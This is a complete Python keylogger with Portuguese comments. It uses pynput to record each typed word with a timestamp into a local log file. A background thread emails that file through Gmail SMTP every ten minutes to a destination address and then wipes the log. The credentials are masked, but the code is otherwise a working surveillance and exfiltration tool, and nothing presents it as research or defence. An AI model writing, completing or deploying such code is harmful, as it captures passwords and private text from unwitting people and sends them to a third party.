import pynput.keyboard as kb
from datetime import datetime
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading

current_word = ""
smtp_server = 'smtp.gmail.com'
smtp_port = 587
sender_email = '************@gmail.com'
app_password = '************'
destination_email = '*****************@gmail.com'
log_file = 'log.txt'

def on_press(key):
    global current_word
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_word += key.char
        elif key == kb.Key.space or key == kb.Key.enter:
            if current_word:
                with open(log_file, "a") as file:
                    file.write(f"{current_word} {datetime.now()}\n")
                current_word = ""
        elif key == kb.Key.backspace:
            current_word = current_word[:-1]
    except Exception as e:
        print(f"Erro: {e}")

def on_release(key):
    if key == kb.Key.esc:
        return False

def email_send():
    while True:
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = destination_email
            msg['Subject'] = 'Arquivo automático'

            # Lê e anexa o log
            with open(log_file, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={log_file}')
            msg.attach(part)

            # Envia o email
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, app_password)
            server.sendmail(sender_email, destination_email, msg.as_string())
            server.quit()

            # Limpa o arquivo após enviar
            with open(log_file, 'w') as f:
                f.truncate(0)

        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")
        
        time.sleep(600)

listener = kb.Listener(on_press=on_press, on_release=on_release)
listener.start()

threading.Thread(target=email_send, daemon=True).start()

listener.join()
